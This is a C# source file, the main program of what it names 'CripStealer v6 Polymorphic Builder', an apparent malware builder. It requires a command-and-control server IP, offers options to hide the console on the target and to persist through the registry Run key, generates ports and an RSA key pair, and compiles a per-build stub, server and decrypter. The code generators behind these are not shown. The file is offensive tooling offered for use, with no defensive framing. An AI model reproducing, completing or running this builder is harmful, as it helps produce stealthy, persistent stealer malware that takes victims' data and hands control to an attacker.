using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace BuilderV6
{
    class Program
    {
        static int Main(string[] args)
        {
            Console.WriteLine("CripStealer v6 Polymorphic Builder");
            Console.WriteLine("===================================");
            Console.WriteLine();

            if (args.Length == 0)
            {
                PrintUsage();
                return 1;
            }
            return RunFromArgs(args);
        }

        static void PrintUsage()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  Builder-v6.exe --server-ip <ip> [options]");
            Console.WriteLine();
            Console.WriteLine("Required:");
            Console.WriteLine("  --server-ip <ip>      C2 server IP address");
            Console.WriteLine();
            Console.WriteLine("Options:");
            Console.WriteLine("  -o <dir>              Output directory (default: ./build)");
            Console.WriteLine("  --stealth             Hide console window on target");
            Console.WriteLine("  --persist             Install to registry Run key");
            Console.WriteLine("  --template-dir <path> Template directory");
        }

        static int RunFromArgs(string[] args)
        {
            string asmDir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) ?? ".";
            string defaultTemplateDir = Path.GetFullPath(Path.Combine(asmDir, "..", "..", "..", "..", "Templates"));
            if (!Directory.Exists(defaultTemplateDir))
                defaultTemplateDir = Path.GetFullPath(Path.Combine(asmDir, "..", "Templates"));

            var cfg = new BuildConfig { OutputDir = "./build", TemplateDir = defaultTemplateDir, Tier = 1 };

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLower())
                {
                    case "--server-ip":
                        if (i + 1 < args.Length) cfg.ServerIp = args[++i];
                        else { Console.Error.WriteLine("Missing value for --server-ip"); return 1; }
                        break;
                    case "-o":
                        if (i + 1 < args.Length) cfg.OutputDir = args[++i];
                        else { Console.Error.WriteLine("Missing value for -o"); return 1; }
                        break;
                    case "--stealth": cfg.Stealth = true; break;
                    case "--persist": cfg.Persist = true; break;
                    case "--template-dir":
                        if (i + 1 < args.Length) cfg.TemplateDir = args[++i];
                        else { Console.Error.WriteLine("Missing value for --template-dir"); return 1; }
                        break;
                    default:
                        Console.Error.WriteLine($"Unknown argument: {args[i]}");
                        return 1;
                }
            }

            if (string.IsNullOrEmpty(cfg.ServerIp))
            {
                Console.Error.WriteLine("--server-ip is required.");
                return 1;
            }

            return Build(cfg);
        }

        static int Build(BuildConfig cfg)
        {
            cfg.ServerPorts = PortGenerator.GeneratePorts(3);
            cfg.BuildId = BuildIdGenerator.Generate(16);

            Console.WriteLine($"Build-ID: {cfg.BuildId}");
            Console.WriteLine($"Ports:    {string.Join(",", cfg.ServerPorts)}");
            Console.WriteLine($"Tier:     1");
            Console.WriteLine();

            byte[] pubBlob, privXml;
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.PersistKeyInCsp = false;
                pubBlob = rsa.ExportCspBlob(false);
                privXml = Encoding.UTF8.GetBytes(rsa.ToXmlString(true));
            }

            var gen = new CodeGenerator(cfg, pubBlob, privXml);
            var stubSource = gen.GenerateStub();
            var serverSource = gen.GenerateServer();
            var decrypterSource = gen.GenerateDecrypter();

            Directory.CreateDirectory(cfg.OutputDir);

            string srcDir = Path.Combine(cfg.OutputDir, $"src_{cfg.BuildId}");
            Directory.CreateDirectory(srcDir);
            foreach (var kv in stubSource.Files)
                File.WriteAllText(Path.Combine(srcDir, "stub_" + kv.Key), kv.Value);
            foreach (var kv in serverSource.Files)
                File.WriteAllText(Path.Combine(srcDir, "srv_" + kv.Key), kv.Value);
            foreach (var kv in decrypterSource.Files)
                File.WriteAllText(Path.Combine(srcDir, "dec_" + kv.Key), kv.Value);

            string stubPath = Path.Combine(cfg.OutputDir, $"stub_{cfg.BuildId}.exe");
            Console.Write("Compiling stub... ");
            if (!Compiler.Compile(stubPath, stubSource.Files))
            { Console.WriteLine("FAILED"); return 1; }
            Console.WriteLine("OK");

            string serverPath = Path.Combine(cfg.OutputDir, $"server_{cfg.BuildId}.exe");
            Console.Write("Compiling server... ");
            if (!Compiler.Compile(serverPath, serverSource.Files))
            { Console.WriteLine("FAILED"); return 1; }
            Console.WriteLine("OK");

            string decPath = Path.Combine(cfg.OutputDir, $"decrypter_{cfg.BuildId}.exe");
            Console.Write("Compiling decrypter... ");
            if (!Compiler.Compile(decPath, decrypterSource.Files))
            { Console.WriteLine("FAILED"); return 1; }
            Console.WriteLine("OK");

            string manifest = $"Build: {cfg.BuildId}\n" +
                              $"IP: {cfg.ServerIp}\n" +
                              $"Ports: {string.Join(",", cfg.ServerPorts)}\n" +
                              $"Tier: 1\n" +
                              $"ClassPrefix: {stubSource.ClassPrefix}\n";
            File.WriteAllText(Path.Combine(cfg.OutputDir, $"manifest_{cfg.BuildId}.txt"), manifest);

            Console.WriteLine();
            Console.WriteLine($"Build complete. Output in {cfg.OutputDir}:");
            Console.WriteLine($"  {Path.GetFileName(stubPath)}");
            Console.WriteLine($"  {Path.GetFileName(serverPath)}");
            Console.WriteLine($"  {Path.GetFileName(decPath)}");
            Console.WriteLine($"  Source saved to: src_{cfg.BuildId}/");
            return 0;
        }
    }
}
